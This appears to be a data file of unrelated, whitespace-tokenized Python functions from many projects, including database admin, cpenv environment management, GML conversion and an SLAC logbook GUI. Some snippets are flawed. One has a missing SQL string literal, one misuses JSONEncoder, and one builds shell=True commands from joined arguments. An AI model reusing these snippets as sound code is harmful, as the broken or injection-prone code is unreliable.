def ensure_format ( doc , format ) : assert format in ( 'xml' , 'json' ) if getattr ( doc , 'tag' , None ) == 'open511' : if format == 'json' : return xml_to_json ( doc ) elif isinstance ( doc , dict ) and 'meta' in doc : if format == 'xml' : return json_doc_to_xml ( doc ) else : raise ValueError ( "Unrecognized input document" ) return doc
def rename ( self , from_name , to_name ) : log . info ( 'renaming database from %s to %s' % ( from_name , to_name ) ) self . _run_stmt ( 'alter database %s rename to %s' % ( from_name , to_name ) )
def connections ( self , name ) : stmt = . format ( fields = ', ' . join ( CONNECTION_FIELDS ) , datname = name ) return list ( Connection ( * * x ) for x in self . _iter_results ( stmt ) )
def available ( self , timeout = 5 ) : host = self . _connect_args [ 'host' ] port = self . _connect_args [ 'port' ] try : sock = socket . create_connection ( ( host , port ) , timeout = timeout ) sock . close ( ) return True except socket . error : pass return False
def settings ( self ) : stmt = "select {fields} from pg_settings" . format ( fields = ', ' . join ( SETTINGS_FIELDS ) ) settings = [ ] for row in self . _iter_results ( stmt ) : row [ 'setting' ] = self . _vartype_map [ row [ 'vartype' ] ] ( row [ 'setting' ] ) settings . append ( Settings ( * * row ) ) return settings
def breakfast ( self , message = "Breakfast is ready" , shout : bool = False ) : return self . helper . output ( message , shout )
def lunch ( self , message = "Time for lunch" , shout : bool = False ) : return self . helper . output ( message , shout )
def dinner ( self , message = "Dinner is served" , shout : bool = False ) : return self . helper . output ( message , shout )
def main ( ) : parser = argparse . ArgumentParser ( description = 'Discover and ingest metadata from document sources, ' 'including lsstdoc-based LaTeX documents and ' 'reStructuredText-based technotes. Metadata can be ' 'upserted into the LSST Projectmeta MongoDB.' ) parser . add_argument ( '--ltd-product' , dest = 'ltd_product_url' , help = 'URL of an LSST the Docs product ' '(https://keeper.lsst.codes/products/<slug>). If provided, ' 'only this document will be ingested.' ) parser . add_argument ( '--github-token' , help = 'GitHub personal access token.' ) parser . add_argument ( '--mongodb-uri' , help = 'MongoDB connection URI. If provided, metadata will be loaded ' 'into the Projectmeta database. Omit this argument to just ' 'test the ingest pipeline.' ) parser . add_argument ( '--mongodb-db' , default = 'lsstprojectmeta' , help = 'Name of MongoDB database' ) parser . add_argument ( '--mongodb-collection' , default = 'resources' , help = 'Name of the MongoDB collection for projectmeta resources' ) args = parser . parse_args ( ) # Configure the root logger stream_handler = logging . StreamHandler ( ) stream_formatter = logging . Formatter ( '%(asctime)s %(levelname)8s %(name)s | %(message)s' ) stream_handler . setFormatter ( stream_formatter ) root_logger = logging . getLogger ( ) root_logger . addHandler ( stream_handler ) root_logger . setLevel ( logging . WARNING ) # Configure app logger app_logger = logging . getLogger ( 'lsstprojectmeta' ) app_logger . setLevel ( logging . DEBUG ) if args . mongodb_uri is not None : mongo_client = AsyncIOMotorClient ( args . mongodb_uri , ssl = True ) collection = mongo_client [ args . mongodb_db ] [ args . mongodb_collection ] else : collection = None loop = asyncio . get_event_loop ( ) if args . ltd_product_url is not None : # Run single technote loop . run_until_complete ( run_single_ltd_doc ( args . ltd_product_url , args . github_token , collection ) ) else : # Run bulk technote processing loop . run_until_complete ( run_bulk_etl ( args . github_token , collection ) )
def decorator ( decorator_func ) : assert callable ( decorator_func ) , type ( decorator_func ) def _decorator ( func = None , * * kwargs ) : assert func is None or callable ( func ) , type ( func ) if func : return decorator_func ( func , * * kwargs ) else : def _decorator_helper ( func ) : return decorator_func ( func , * * kwargs ) return _decorator_helper return _decorator
def make_aware ( value , timezone ) : if hasattr ( timezone , 'localize' ) and value not in ( datetime . datetime . min , datetime . datetime . max ) : # available for pytz time zones return timezone . localize ( value , is_dst = None ) else : # may be wrong around DST changes return value . replace ( tzinfo = timezone )
def make_naive ( value , timezone ) : value = value . astimezone ( timezone ) if hasattr ( timezone , 'normalize' ) : # available for pytz time zones value = timezone . normalize ( value ) return value . replace ( tzinfo = None )
def to_timezone ( self , dt ) : if timezone . is_aware ( dt ) : return dt . astimezone ( self . timezone ) else : return timezone . make_aware ( dt , self . timezone )
def period ( self ) : start_time = self . root . findtext ( 'daily_start_time' ) if start_time : return Period ( text_to_time ( start_time ) , text_to_time ( self . root . findtext ( 'daily_end_time' ) ) ) return Period ( datetime . time ( 0 , 0 ) , datetime . time ( 23 , 59 ) )
async def download_metadata_yaml ( session , github_url ) : metadata_yaml_url = _build_metadata_yaml_url ( github_url ) async with session . get ( metadata_yaml_url ) as response : response . raise_for_status ( ) yaml_data = await response . text ( ) return yaml . safe_load ( yaml_data )
def tz ( self ) : if not self . _tz : self . _tz = tzlocal . get_localzone ( ) . zone return self . _tz
def time ( self , t ) : _time = arrow . get ( t ) . format ( 'YYYY-MM-DDTHH:mm:ss' ) self . _time = datetime . datetime . strptime ( _time , '%Y-%m-%dT%H:%M:%S' )
def as_dict ( self ) : entry_dict = { } entry_dict [ 'UUID' ] = self . uuid entry_dict [ 'Creation Date' ] = self . time entry_dict [ 'Time Zone' ] = self . tz if self . tags : entry_dict [ 'Tags' ] = self . tags entry_dict [ 'Entry Text' ] = self . text entry_dict [ 'Starred' ] = self . starred entry_dict [ 'Location' ] = self . location return entry_dict
def save ( self , entry , with_location = True , debug = False ) : entry_dict = { } if isinstance ( entry , DayOneEntry ) : # Get a dict of the DayOneEntry entry_dict = entry . as_dict ( ) else : entry_dict = entry # Set the UUID entry_dict [ 'UUID' ] = uuid . uuid4 ( ) . get_hex ( ) if with_location and not entry_dict [ 'Location' ] : entry_dict [ 'Location' ] = self . get_location ( ) # Do we have everything needed? if not all ( ( entry_dict [ 'UUID' ] , entry_dict [ 'Time Zone' ] , entry_dict [ 'Entry Text' ] ) ) : print "You must provide: Time zone, UUID, Creation Date, Entry Text" return False if debug is False : file_path = self . _file_path ( entry_dict [ 'UUID' ] ) plistlib . writePlist ( entry_dict , file_path ) else : plist = plistlib . writePlistToString ( entry_dict ) print plist return True
def _file_path ( self , uid ) : file_name = '%s.doentry' % ( uid ) return os . path . join ( self . dayone_journal_path , file_name )
def combine ( self , members , output_file , dimension = None , start_index = None , stop_index = None , stride = None ) : nco = None try : nco = Nco ( ) except BaseException : # This is not necessarily an import error (could be wrong PATH) raise ImportError ( "NCO not found.  The NCO python bindings are required to use 'Collection.combine'." ) if len ( members ) > 0 and hasattr ( members [ 0 ] , 'path' ) : # A member DotDoct was passed in, we only need the paths members = [ m . path for m in members ] options = [ '-4' ] # NetCDF4 options += [ '-L' , '3' ] # Level 3 compression options += [ '-h' ] # Don't append to the history global attribute if dimension is not None : if start_index is None : start_index = 0 if stop_index is None : stop_index = '' if stride is None : stride = 1 options += [ '-d' , '{0},{1},{2},{3}' . format ( dimension , start_index , stop_index , stride ) ] nco . ncrcat ( input = members , output = output_file , options = options )
def get_parameters ( self ) : if self . plugin_class is None : sig = inspect . signature ( self . func ) for index , parameter in enumerate ( sig . parameters . values ( ) ) : if not parameter . kind in [ parameter . POSITIONAL_ONLY , parameter . KEYWORD_ONLY , parameter . POSITIONAL_OR_KEYWORD ] : raise RuntimeError ( "Task {} contains an unsupported {} parameter" . format ( parameter , parameter . kind ) ) yield parameter else : var_keyword_seen = set ( ) for cls in inspect . getmro ( self . plugin_class ) : if issubclass ( cls , BasePlugin ) and hasattr ( cls , self . func . __name__ ) : func = getattr ( cls , self . func . __name__ ) logger . debug ( "Found method %s from class %s" , func , cls ) var_keyword_found = False sig = inspect . signature ( func ) for index , parameter in enumerate ( sig . parameters . values ( ) ) : if index == 0 : # skip "self" parameter continue if parameter . kind == inspect . Parameter . VAR_KEYWORD : # found "**kwargs" parameter.  we will continue to the next class in the mro # to add any keyword parameters we have not yet used (i.e. whose name # we have not yet seen) var_keyword_found = True continue if parameter . kind in [ parameter . POSITIONAL_ONLY , parameter . VAR_POSITIONAL ] : raise RuntimeError ( "Task {} contains an unsupported parameter \"{}\"" . format ( func , parameter ) ) if not parameter . name in var_keyword_seen : var_keyword_seen . add ( parameter . name ) logger . debug ( "Found parameter %s (%s)" , parameter , parameter . kind ) yield parameter # we only need to look at the next class in the mro # when "**kwargs" is found if not var_keyword_found : break
def get_configuration ( self , key , default = None ) : if key in self . config : return self . config . get ( key ) else : return default
def gml_to_geojson ( el ) : if el . get ( 'srsName' ) not in ( 'urn:ogc:def:crs:EPSG::4326' , None ) : if el . get ( 'srsName' ) == 'EPSG:4326' : return _gmlv2_to_geojson ( el ) else : raise NotImplementedError ( "Unrecognized srsName %s" % el . get ( 'srsName' ) ) tag = el . tag . replace ( '{%s}' % NS_GML , '' ) if tag == 'Point' : coordinates = _reverse_gml_coords ( el . findtext ( '{%s}pos' % NS_GML ) ) [ 0 ] elif tag == 'LineString' : coordinates = _reverse_gml_coords ( el . findtext ( '{%s}posList' % NS_GML ) ) elif tag == 'Polygon' : coordinates = [ ] for ring in el . xpath ( 'gml:exterior/gml:LinearRing/gml:posList' , namespaces = NSMAP ) + el . xpath ( 'gml:interior/gml:LinearRing/gml:posList' , namespaces = NSMAP ) : coordinates . append ( _reverse_gml_coords ( ring . text ) ) elif tag in ( 'MultiPoint' , 'MultiLineString' , 'MultiPolygon' ) : single_type = tag [ 5 : ] member_tag = single_type [ 0 ] . lower ( ) + single_type [ 1 : ] + 'Member' coordinates = [ gml_to_geojson ( member ) [ 'coordinates' ] for member in el . xpath ( 'gml:%s/gml:%s' % ( member_tag , single_type ) , namespaces = NSMAP ) ] else : raise NotImplementedError return { 'type' : tag , 'coordinates' : coordinates }
def _gmlv2_to_geojson ( el ) : tag = el . tag . replace ( '{%s}' % NS_GML , '' ) if tag == 'Point' : coordinates = [ float ( c ) for c in el . findtext ( '{%s}coordinates' % NS_GML ) . split ( ',' ) ] elif tag == 'LineString' : coordinates = [ [ float ( x ) for x in pair . split ( ',' ) ] for pair in el . findtext ( '{%s}coordinates' % NS_GML ) . split ( ' ' ) ] elif tag == 'Polygon' : coordinates = [ ] for ring in el . xpath ( 'gml:outerBoundaryIs/gml:LinearRing/gml:coordinates' , namespaces = NSMAP ) + el . xpath ( 'gml:innerBoundaryIs/gml:LinearRing/gml:coordinates' , namespaces = NSMAP ) : coordinates . append ( [ [ float ( x ) for x in pair . split ( ',' ) ] for pair in ring . text . split ( ' ' ) ] ) elif tag in ( 'MultiPoint' , 'MultiLineString' , 'MultiPolygon' , 'MultiCurve' ) : if tag == 'MultiCurve' : single_type = 'LineString' member_tag = 'curveMember' else : single_type = tag [ 5 : ] member_tag = single_type [ 0 ] . lower ( ) + single_type [ 1 : ] + 'Member' coordinates = [ gml_to_geojson ( member ) [ 'coordinates' ] for member in el . xpath ( 'gml:%s/gml:%s' % ( member_tag , single_type ) , namespaces = NSMAP ) ] else : raise NotImplementedError return { 'type' : tag , 'coordinates' : coordinates }
def all_subclasses ( cls ) : for subclass in cls . __subclasses__ ( ) : yield subclass for subc in all_subclasses ( subclass ) : yield subc
def unique_justseen ( iterable , key = None ) : # unique_justseen('AAAABBBCCDAABBB') --> A B C D A B # unique_justseen('ABBCcAD', str.lower) --> A B C A D try : # PY2 support from itertools import imap as map except ImportError : from builtins import map return map ( next , map ( operator . itemgetter ( 1 ) , itertools . groupby ( iterable , key ) ) )
def default ( self , obj ) : if isinstance ( obj , np . ndarray ) : return obj . tolist ( ) elif isinstance ( obj , np . generic ) : return np . asscalar ( obj ) # Let the base class default method raise the TypeError return json . JSONEncoder ( self , obj )
def find_repos ( self , depth = 10 ) : repos = [ ] for root , subdirs , files in walk_dn ( self . root , depth = depth ) : if 'modules' in root : continue if '.git' in subdirs : repos . append ( root ) return repos
def clone ( self , repo_path , destination , branch = None ) : logger . debug ( 'Installing ' + repo_path ) if not destination . startswith ( self . env_path ) : destination = unipath ( self . env_path , destination ) if branch : return shell . run ( 'git' , 'clone' , repo_path , '--branch' , branch , '--single-branch' , '--recursive' , destination ) return shell . run ( 'git' , 'clone' , '--recursive' , repo_path , destination )
def pull ( self , repo_path , * args ) : logger . debug ( 'Pulling ' + repo_path ) if not repo_path . startswith ( self . env_path ) : repo_path = unipath ( self . env_path , repo_path ) return shell . run ( 'git' , 'pull' , * args , * * { 'cwd' : repo_path } )
def install ( self , package ) : logger . debug ( 'Installing ' + package ) shell . run ( self . pip_path , 'install' , package )
def upgrade ( self , package ) : logger . debug ( 'Upgrading ' + package ) shell . run ( self . pip_path , 'install' , '--upgrade' , '--no-deps' , package ) shell . run ( self . pip_path , 'install' , package )
def df_quantile ( df , nb = 100 ) : quantiles = np . linspace ( 0 , 1. , nb ) res = pd . DataFrame ( ) for q in quantiles : res = res . append ( df . quantile ( q ) , ignore_index = True ) return res
def rmse ( a , b ) : return np . sqrt ( np . square ( a - b ) . mean ( ) )
def nmse ( a , b ) : return np . square ( a - b ) . mean ( ) / ( a . mean ( ) * b . mean ( ) )
def mfbe ( a , b ) : return 2 * bias ( a , b ) / ( a . mean ( ) + b . mean ( ) )
def foex ( a , b ) : return ( np . sum ( a > b , dtype = float ) / len ( a ) - 0.5 ) * 100
def fmt ( a , b ) : return 100 * np . min ( [ a , b ] , axis = 0 ) . sum ( ) / np . max ( [ a , b ] , axis = 0 ) . sum ( )
def site_path ( self ) : if platform == 'win' : return unipath ( self . path , 'Lib' , 'site-packages' ) py_ver = 'python{0}' . format ( sys . version [ : 3 ] ) return unipath ( self . path , 'lib' , py_ver , 'site-packages' )
def command ( self ) : cmd = self . config . get ( 'command' , None ) if cmd is None : return cmd = cmd [ platform ] return cmd [ 'path' ] , cmd [ 'args' ]
def get_modules ( ) : modules = set ( ) cwd = os . getcwd ( ) for d in os . listdir ( cwd ) : if d == 'module.yml' : modules . add ( Module ( cwd ) ) path = unipath ( cwd , d ) if utils . is_module ( path ) : modules . add ( Module ( cwd ) ) module_paths = get_module_paths ( ) for module_path in module_paths : for d in os . listdir ( module_path ) : path = unipath ( module_path , d ) if utils . is_module ( path ) : modules . add ( Module ( path ) ) return sorted ( list ( modules ) , key = lambda x : x . name )
def add_active_module ( module ) : modules = set ( get_active_modules ( ) ) modules . add ( module ) new_modules_path = os . pathsep . join ( [ m . path for m in modules ] ) os . environ [ 'CPENV_ACTIVE_MODULES' ] = str ( new_modules_path )
def rem_active_module ( module ) : modules = set ( get_active_modules ( ) ) modules . discard ( module ) new_modules_path = os . pathsep . join ( [ m . path for m in modules ] ) os . environ [ 'CPENV_ACTIVE_MODULES' ] = str ( new_modules_path )
def format_objects ( objects , children = False , columns = None , header = True ) : columns = columns or ( 'NAME' , 'TYPE' , 'PATH' ) objects = sorted ( objects , key = _type_and_name ) data = [ ] for obj in objects : if isinstance ( obj , cpenv . VirtualEnvironment ) : data . append ( get_info ( obj ) ) modules = obj . get_modules ( ) if children and modules : for mod in modules : data . append ( get_info ( mod , indent = 2 , root = obj . path ) ) else : data . append ( get_info ( obj ) ) maxes = [ len ( max ( col , key = len ) ) for col in zip ( * data ) ] tmpl = '{:%d}  {:%d}  {:%d}' % tuple ( maxes ) lines = [ ] if header : lines . append ( '\n' + bold_blue ( tmpl . format ( * columns ) ) ) for obj_data in data : lines . append ( tmpl . format ( * obj_data ) ) return '\n' . join ( lines )
def list_ ( ) : environments = cpenv . get_environments ( ) modules = cpenv . get_modules ( ) click . echo ( format_objects ( environments + modules , children = True ) )
def create ( name_or_path , config ) : if not name_or_path : ctx = click . get_current_context ( ) click . echo ( ctx . get_help ( ) ) examples = ( '\nExamples:\n' '    cpenv create my_env\n' '    cpenv create ./relative/path/to/my_env\n' '    cpenv create my_env --config ./relative/path/to/config\n' '    cpenv create my_env --config git@github.com:user/config.git\n' ) click . echo ( examples ) return click . echo ( blue ( 'Creating a new virtual environment ' + name_or_path ) ) try : env = cpenv . create ( name_or_path , config ) except Exception as e : click . echo ( bold_red ( 'FAILED TO CREATE ENVIRONMENT!' ) ) click . echo ( e ) else : click . echo ( bold_green ( 'Successfully created environment!' ) ) click . echo ( blue ( 'Launching subshell' ) ) cpenv . activate ( env ) shell . launch ( env . name )
def list_ ( ) : click . echo ( 'Cached Environments' ) environments = list ( EnvironmentCache ) click . echo ( format_objects ( environments , children = False ) )
def localize ( name ) : env = cpenv . get_active_env ( ) if not env : click . echo ( 'You need to activate an environment first.' ) return try : r = cpenv . resolve ( name ) except cpenv . ResolveError as e : click . echo ( '\n' + str ( e ) ) module = r . resolved [ 0 ] if isinstance ( module , cpenv . VirtualEnvironment ) : click . echo ( '\nCan only localize a module not an environment' ) return active_modules = cpenv . get_active_modules ( ) if module in active_modules : click . echo ( '\nCan not localize an active module.' ) return if module in env . get_modules ( ) : click . echo ( '\n{} is already local to {}' . format ( module . name , env . name ) ) return if click . confirm ( '\nAdd {} to env {}?' . format ( module . name , env . name ) ) : click . echo ( 'Adding module...' , nl = False ) try : module = env . add_module ( module . name , module . path ) except : click . echo ( bold_red ( 'FAILED' ) ) raise else : click . echo ( bold_green ( 'OK!' ) ) click . echo ( '\nActivate the localize module:' ) click . echo ( '    cpenv activate {} {}' . format ( env . name , module . name ) )
def path_resolver ( resolver , path ) : path = unipath ( path ) if is_environment ( path ) : return VirtualEnvironment ( path ) raise ResolveError
def home_resolver ( resolver , path ) : from . api import get_home_path path = unipath ( get_home_path ( ) , path ) if is_environment ( path ) : return VirtualEnvironment ( path ) raise ResolveError
def cache_resolver ( resolver , path ) : env = resolver . cache . find ( path ) if env : return env raise ResolveError
def module_resolver ( resolver , path ) : if resolver . resolved : if isinstance ( resolver . resolved [ 0 ] , VirtualEnvironment ) : env = resolver . resolved [ 0 ] mod = env . get_module ( path ) if mod : return mod raise ResolveError
def active_env_module_resolver ( resolver , path ) : from . api import get_active_env env = get_active_env ( ) if not env : raise ResolveError mod = env . get_module ( path ) if not mod : raise ResolveError return mod
def _broadcast_shape ( * args ) : #TODO: currently incorrect result if a Sequence is provided as an input shapes = [ a . shape if hasattr ( type ( a ) , '__array_interface__' ) else ( ) for a in args ] ndim = max ( len ( sh ) for sh in shapes ) # new common ndim after broadcasting for i , sh in enumerate ( shapes ) : if len ( sh ) < ndim : shapes [ i ] = ( 1 , ) * ( ndim - len ( sh ) ) + sh return tuple ( max ( sh [ ax ] for sh in shapes ) for ax in range ( ndim ) )
def run ( * args , * * kwargs ) : kwargs . setdefault ( 'env' , os . environ ) kwargs . setdefault ( 'shell' , True ) try : subprocess . check_call ( ' ' . join ( args ) , * * kwargs ) return True except subprocess . CalledProcessError : logger . debug ( 'Error running: {}' . format ( args ) ) return False
def cmd ( ) : if platform == 'win' : return [ 'cmd.exe' , '/K' ] elif platform == 'linux' : ppid = os . getppid ( ) ppid_cmdline_file = '/proc/{0}/cmdline' . format ( ppid ) try : with open ( ppid_cmdline_file ) as f : cmd = f . read ( ) if cmd . endswith ( '\x00' ) : cmd = cmd [ : - 1 ] cmd = cmd . split ( '\x00' ) return cmd + [ binpath ( 'subshell.sh' ) ] except : cmd = 'bash' else : cmd = 'bash' return [ cmd , binpath ( 'subshell.sh' ) ]
def run_global_hook ( hook_name , * args ) : hook_finder = HookFinder ( get_global_hook_path ( ) ) hook = hook_finder ( hook_name ) if hook : hook . run ( * args )
def validate ( self ) : for env in list ( self ) : if not env . exists : self . remove ( env )
def load ( self ) : if not os . path . exists ( self . path ) : return with open ( self . path , 'r' ) as f : env_data = yaml . load ( f . read ( ) ) if env_data : for env in env_data : self . add ( VirtualEnvironment ( env [ 'root' ] ) )
def save ( self ) : env_data = [ dict ( name = env . name , root = env . path ) for env in self ] encode = yaml . safe_dump ( env_data , default_flow_style = False ) with open ( self . path , 'w' ) as f : f . write ( encode )
def gather ( obj ) : if hasattr ( obj , '__distob_gather__' ) : return obj . __distob_gather__ ( ) elif ( isinstance ( obj , collections . Sequence ) and not isinstance ( obj , string_types ) ) : return [ gather ( subobj ) for subobj in obj ] else : return obj
def apply ( f , obj , * args , * * kwargs ) : return vectorize ( f ) ( obj , * args , * * kwargs )
def is_git_repo ( path ) : if path . startswith ( 'git@' ) or path . startswith ( 'https://' ) : return True if os . path . exists ( unipath ( path , '.git' ) ) : return True return False
def is_home_environment ( path ) : home = unipath ( os . environ . get ( 'CPENV_HOME' , '~/.cpenv' ) ) path = unipath ( path ) return path . startswith ( home )
def is_redirecting ( path ) : candidate = unipath ( path , '.cpenv' ) return os . path . exists ( candidate ) and os . path . isfile ( candidate )
def redirect_to_env_paths ( path ) : with open ( path , 'r' ) as f : redirected = f . read ( ) return shlex . split ( redirected )
def expandpath ( path ) : return os . path . abspath ( os . path . expandvars ( os . path . expanduser ( path ) ) )
def unipath ( * paths ) : return os . path . normpath ( expandpath ( os . path . join ( * paths ) ) )
def binpath ( * paths ) : package_root = os . path . dirname ( __file__ ) return os . path . normpath ( os . path . join ( package_root , 'bin' , * paths ) )
def ensure_path_exists ( path , * args ) : if os . path . exists ( path ) : return os . makedirs ( path , * args )
def walk_up ( start_dir , depth = 20 ) : root = start_dir for i in xrange ( depth ) : contents = os . listdir ( root ) subdirs , files = [ ] , [ ] for f in contents : if os . path . isdir ( os . path . join ( root , f ) ) : subdirs . append ( f ) else : files . append ( f ) yield root , subdirs , files parent = os . path . dirname ( root ) if parent and not parent == root : root = parent else : break
def _join_seq ( d , k , v ) : if k not in d : d [ k ] = list ( v ) elif isinstance ( d [ k ] , list ) : for item in v : if item not in d [ k ] : d [ k ] . insert ( 0 , item ) elif isinstance ( d [ k ] , string_types ) : v . append ( d [ k ] ) d [ k ] = v
def join_dicts ( * dicts ) : out_dict = { } for d in dicts : for k , v in d . iteritems ( ) : if not type ( v ) in JOINERS : raise KeyError ( 'Invalid type in dict: {}' . format ( type ( v ) ) ) JOINERS [ type ( v ) ] ( out_dict , k , v ) return out_dict
def get_store_env_tmp ( ) : tempdir = tempfile . gettempdir ( ) temp_name = 'envstore{0:0>3d}' temp_path = unipath ( tempdir , temp_name . format ( random . getrandbits ( 9 ) ) ) if not os . path . exists ( temp_path ) : return temp_path else : return get_store_env_tmp ( )
def upstream_url ( self , uri ) : return self . application . options . upstream + self . request . uri
def make_upstream_request ( self ) : url = self . upstream_url ( self . request . uri ) return tornado . httpclient . HTTPRequest ( url , method = self . request . method , headers = self . request . headers , body = self . request . body if self . request . body else None )
def k_ion ( self , E ) : return self . n_p * _np . power ( _spc . e , 2 ) / ( 2 * _sltr . GeV2joule ( E ) * _spc . epsilon_0 )
def paginate_update ( update ) : from happenings . models import Update time = update . pub_time event = update . event try : next = Update . objects . filter ( event = event , pub_time__gt = time ) . order_by ( 'pub_time' ) . only ( 'title' ) [ 0 ] except : next = None try : previous = Update . objects . filter ( event = event , pub_time__lt = time ) . order_by ( '-pub_time' ) . only ( 'title' ) [ 0 ] except : previous = None return { 'next' : next , 'previous' : previous , 'event' : event }
def settings_and_attributes ( self ) : attrs = self . setting_values ( ) attrs . update ( self . __dict__ ) skip = [ "_instance_settings" , "aliases" ] for a in skip : del attrs [ a ] return attrs
def get_reference_to_class ( cls , class_or_class_name ) : if isinstance ( class_or_class_name , type ) : return class_or_class_name elif isinstance ( class_or_class_name , string_types ) : if ":" in class_or_class_name : mod_name , class_name = class_or_class_name . split ( ":" ) if not mod_name in sys . modules : __import__ ( mod_name ) mod = sys . modules [ mod_name ] return mod . __dict__ [ class_name ] else : return cls . load_class_from_locals ( class_or_class_name ) else : msg = "Unexpected Type '%s'" % type ( class_or_class_name ) raise InternalCashewException ( msg )
def check_docstring ( cls ) : docstring = inspect . getdoc ( cls ) if not docstring : breadcrumbs = " -> " . join ( t . __name__ for t in inspect . getmro ( cls ) [ : - 1 ] [ : : - 1 ] ) msg = "docstring required for plugin '%s' (%s, defined in %s)" args = ( cls . __name__ , breadcrumbs , cls . __module__ ) raise InternalCashewException ( msg % args ) max_line_length = cls . _class_settings . get ( 'max-docstring-length' ) if max_line_length : for i , line in enumerate ( docstring . splitlines ( ) ) : if len ( line ) > max_line_length : msg = "docstring line %s of %s is %s chars too long" args = ( i , cls . __name__ , len ( line ) - max_line_length ) raise Exception ( msg % args ) return docstring
def resourcePath ( self , relative_path ) : from os import path import sys try : # PyInstaller creates a temp folder and stores path in _MEIPASS base_path = sys . _MEIPASS except Exception : base_path = path . dirname ( path . abspath ( __file__ ) ) return path . join ( base_path , relative_path )
def addLogbook ( self , physDef = "LCLS" , mccDef = "MCC" , initialInstance = False ) : if self . logMenuCount < 5 : self . logMenus . append ( LogSelectMenu ( self . logui . multiLogLayout , initialInstance ) ) self . logMenus [ - 1 ] . addLogbooks ( self . logTypeList [ 1 ] , self . physics_programs , physDef ) self . logMenus [ - 1 ] . addLogbooks ( self . logTypeList [ 0 ] , self . mcc_programs , mccDef ) self . logMenus [ - 1 ] . show ( ) self . logMenuCount += 1 if initialInstance : # Initial logbook menu can add additional menus, all others can only remove themselves. QObject . connect ( self . logMenus [ - 1 ] . logButton , SIGNAL ( "clicked()" ) , self . addLogbook ) else : from functools import partial QObject . connect ( self . logMenus [ - 1 ] . logButton , SIGNAL ( "clicked()" ) , partial ( self . removeLogbook , self . logMenus [ - 1 ] ) )
def removeLogbook ( self , menu = None ) : if self . logMenuCount > 1 and menu is not None : menu . removeMenu ( ) self . logMenus . remove ( menu ) self . logMenuCount -= 1
def selectedLogs ( self ) : mcclogs = [ ] physlogs = [ ] for i in range ( len ( self . logMenus ) ) : logType = self . logMenus [ i ] . selectedType ( ) log = self . logMenus [ i ] . selectedProgram ( ) if logType == "MCC" : if log not in mcclogs : mcclogs . append ( log ) elif logType == "Physics" : if log not in physlogs : physlogs . append ( log ) return mcclogs , physlogs
def acceptedUser ( self , logType ) : from urllib2 import urlopen , URLError , HTTPError import json isApproved = False userName = str ( self . logui . userName . text ( ) ) if userName == "" : return False # Must have a user name to submit entry if logType == "MCC" : networkFault = False data = [ ] log_url = "https://mccelog.slac.stanford.edu/elog/dev/mgibbs/dev_json_user_list.php/?username=" + userName try : data = urlopen ( log_url , None , 5 ) . read ( ) data = json . loads ( data ) except URLError as error : print ( "URLError: " + str ( error . reason ) ) networkFault = True except HTTPError as error : print ( "HTTPError: " + str ( error . reason ) ) networkFault = True # If network fails, ask user to verify if networkFault : msgBox = QMessageBox ( ) msgBox . setText ( "Cannot connect to MCC Log Server!" ) msgBox . setInformativeText ( "Use entered User name anyway?" ) msgBox . setStandardButtons ( QMessageBox . Ok | QMessageBox . Cancel ) msgBox . setDefaultButton ( QMessageBox . Ok ) if msgBox . exec_ ( ) == QMessageBox . Ok : isApproved = True if data != [ ] and ( data is not None ) : isApproved = True else : isApproved = True return isApproved
def xmlSetup ( self , logType , logList ) : from xml . etree . ElementTree import Element , SubElement , ElementTree from datetime import datetime curr_time = datetime . now ( ) if logType == "MCC" : # Set up xml tags log_entry = Element ( 'log_entry' ) title = SubElement ( log_entry , 'title' ) program = SubElement ( log_entry , 'program' ) timestamp = SubElement ( log_entry , 'timestamp' ) priority = SubElement ( log_entry , 'priority' ) os_user = SubElement ( log_entry , 'os_user' ) hostname = SubElement ( log_entry , 'hostname' ) text = SubElement ( log_entry , 'text' ) log_user = SubElement ( log_entry , 'log_user' ) # Check for multiple logbooks and parse into seperate tags logbook = [ ] for i in range ( len ( logList ) ) : logbook . append ( SubElement ( log_entry , 'logbook' ) ) logbook [ i ] . text = logList [ i ] . lower ( ) # Take care of dummy, unchanging tags first log_entry . attrib [ 'type' ] = "LOGENTRY" program . text = "152" priority . text = "NORMAL" os_user . text = "nobody" hostname . text = "mccelog" text . attrib [ 'type' ] = "text/plain" # Handle attachment if image exists if not self . imagePixmap . isNull ( ) : attachment = SubElement ( log_entry , 'attachment' ) attachment . attrib [ 'name' ] = "Figure 1" attachment . attrib [ 'type' ] = "image/" + self . imageType attachment . text = curr_time . strftime ( "%Y%m%d_%H%M%S_" ) + str ( curr_time . microsecond ) + "." + self . imageType # Set timestamp format timestamp . text = curr_time . strftime ( "%Y/%m/%d %H:%M:%S" ) fileName = "/tmp/" + curr_time . strftime ( "%Y%m%d_%H%M%S_" ) + str ( curr_time . microsecond ) + ".xml" else : # If using Physics logbook timeString = curr_time . strftime ( "%Y-%m-%dT%H:%M:%S" ) # Set up xml tags log_entry = Element ( None ) severity = SubElement ( log_entry , 'severity' ) location = SubElement ( log_entry , 'location' ) keywords = SubElement ( log_entry , 'keywords' ) time = SubElement ( log_entry , 'time' ) isodate = SubElement ( log_entry , 'isodate' ) log_user = SubElement ( log_entry , 'author' ) category = SubElement ( log_entry , 'category' ) title = SubElement ( log_entry , 'title' ) metainfo = SubElement ( log_entry , 'metainfo' ) # Handle attachment if image exists if not self . imagePixmap . isNull ( ) : imageFile = SubElement ( log_entry , 'link' ) imageFile . text = timeString + "-00." + self . imageType thumbnail = SubElement ( log_entry , 'file' ) thumbnail . text = timeString + "-00.png" text = SubElement ( log_entry , 'text' ) # Logbook expects Text tag to come last (for some strange reason) # Take care of dummy, unchanging tags first log_entry . attrib [ 'type' ] = "LOGENTRY" category . text = "USERLOG" location . text = "not set" severity . text = "NONE" keywords . text = "none" time . text = curr_time . strftime ( "%H:%M:%S" ) isodate . text = curr_time . strftime ( "%Y-%m-%d" ) metainfo . text = timeString + "-00.xml" fileName = "/tmp/" + metainfo . text # Fill in user inputs log_user . text = str ( self . logui . userName . text ( ) ) title . text = str ( self . logui . titleEntry . text ( ) ) if title . text == "" : QMessageBox ( ) . warning ( self , "No Title entered" , "Please enter a title for the entry..." ) return None text . text = str ( self . logui . textEntry . toPlainText ( ) ) # If text field is truly empty, ElementTree leaves off tag entirely which causes logbook parser to fail if text . text == "" : text . text = " " # Create xml file xmlFile = open ( fileName , "w" ) if logType == "MCC" : ElementTree ( log_entry ) . write ( xmlFile ) else : xmlString = self . prettify ( log_entry ) xmlFile . write ( xmlString ) xmlFile . write ( "\n" ) # Close with newline so cron job parses correctly xmlFile . close ( ) return fileName . rstrip ( ".xml" )
